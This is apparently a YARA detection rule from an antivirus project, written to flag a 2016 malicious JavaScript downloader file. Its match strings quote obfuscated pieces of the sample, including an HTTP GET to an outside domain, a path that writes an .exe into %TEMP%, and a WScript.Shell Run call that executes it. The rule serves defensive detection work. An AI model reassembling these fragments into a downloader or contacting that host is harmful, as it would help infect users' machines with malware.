rule sig_20160328_f92f9667466f5089b981612a9caeb605 {
  meta:
    description = "datamaliciousorder - file 20160328_f92f9667466f5089b981612a9caeb605.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "cc0f2d59648208fc656c200fed11c2fc4a1ade1f81e00f71530e3213ed0cd432"

  strings:
    $s1  = "function Apqrluedbk() {return Rtojsdhj[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"VJsMwWEul.exe\";};" fullword ascii
    $s2  = "Beyyjafl[Afekfda](\"GET\", \"http://zapableapp.com/l1sape\", false);" fullword ascii
    $s3  = "var Rtojsdhj = function Jmlogxnk() {return WScript[Wgzyzdfus](\"WScript.Shell\");}();" fullword ascii
    $s4  = "do {WScript[Svamt](Ynymq() * 11)} while (Beyyjafl[\"readystate\"] < 4 );" fullword ascii
    $s5  = "function Rtxamr(Syzxr, Imgbslesx){return Syzxr - Imgbslesx;};" fullword ascii
    $s6  = "function Jzsaqgmir(Jnczhmznte){Rtojsdhj[\"Run\"](Jnczhmznte, Aaykksvcpg, Aaykksvcpg);};" fullword ascii
    $s7  = "function Knpunpuon() {return ((Nlbpocmgk == true) && (Nlbpocmgk == Lvgtpgx)) ? 1 : Aaykksvcpg;};" fullword ascii
    $s8  = "Lmbifaeat = \"07t9gasdf76ags\" + 123313 * Decad + Lmbifaeat; " fullword ascii
    $s9  = "var Lvgtpgx = false;" fullword ascii
    $s10 = "Nlbpocmgk = true; " fullword ascii
    $s11 = "function Kidwgzo(){return Igutt;};" fullword ascii
    $s12 = "function Qfcxvevyrc()" fullword ascii
    $s13 = "function Ctlipx(Vfresj) {var Zcyvmbnchy = (1, 2, 3, 4, 5, Vfresj); return Zcyvmbnchy;};" fullword ascii
    $s14 = "var Wlmwaftjls = false;" fullword ascii
    $s15 = "var Dfjmkanud = new this[\"Date\"]();" fullword ascii
    $s16 = " while (Skylbv){" fullword ascii
    $s17 = "Lvgtpgx = true; " fullword ascii
    $s18 = "function Biezgi(){return Wgzyzdfus;};" fullword ascii
    $s19 = "function Ynymq(){return 22;};" fullword ascii
    $s20 = "var Nlbpocmgk = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}